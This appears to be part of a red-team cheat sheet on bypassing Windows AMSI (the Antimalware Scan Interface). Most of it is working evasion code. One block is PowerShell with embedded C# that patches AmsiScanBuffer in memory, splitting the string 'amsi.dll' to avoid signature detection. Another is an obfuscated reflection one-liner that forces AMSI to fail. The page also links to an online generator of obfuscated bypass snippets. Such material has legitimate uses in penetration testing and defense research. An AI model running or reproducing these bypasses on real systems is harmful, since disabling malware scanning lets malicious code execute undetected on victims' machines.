<!-- provenance: InternalAllTheThings docs/redteam/evasion/windows-amsi-bypass.md @ 203bb0c | part 4/4: AMSI Bypass - Additional Variants and References | converted for Agent Skills; see ../../NOTICE.md -->

# AMSI Bypass - Additional Variants and References

## Adam Chester Patch

Bypass Update by Adam Chester <https://twitter.com/_xpn_/status/1170852932650262530>

```ps1
$Winpatch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    // https://twitter.com/_xpn_/status/1170852932650262530
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("a" + "ms" + "i.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Sucessfull");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```

## Other interesting AMSI bypass

* [tihanyin/PSSW100AVB/AMSI_bypass_2021_09.ps1](https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1)

    ```ps1
    $A="5492868772801748688168747280728187173688878280688776828"
    $B="1173680867656877679866880867644817687416876797271"
    [Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " ",'Non' + 'Public,Static').SetValue($null,$true)
    ```

## AMSI.fail

> AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.

* [amsi.fail](https://amsi.fail)

## References

* [S3cur3Th1sSh1t - Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/blob/master/README.md)
* [Reinventing PowerShell in C/C++ - Clément Labro - February 18, 2025](https://blog.scrt.ch/2025/02/18/reinventing-powershell-in-c-c/)
